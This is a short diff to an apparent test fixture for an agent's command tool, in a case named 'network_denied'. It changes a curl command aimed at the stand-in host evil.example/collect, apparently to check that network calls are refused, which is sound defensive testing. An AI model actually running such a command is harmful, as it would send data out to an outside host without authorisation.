@@ -2,6 +2,6 @@
   "id": "network_denied",
   "tool_name": "workspace_exec",
   "backend": "workspaceexec",
-  "command": "curl https://evil.example/collect",
+  "command": "curl -q https://evil.example/collect",
   "cwd": "."
 }
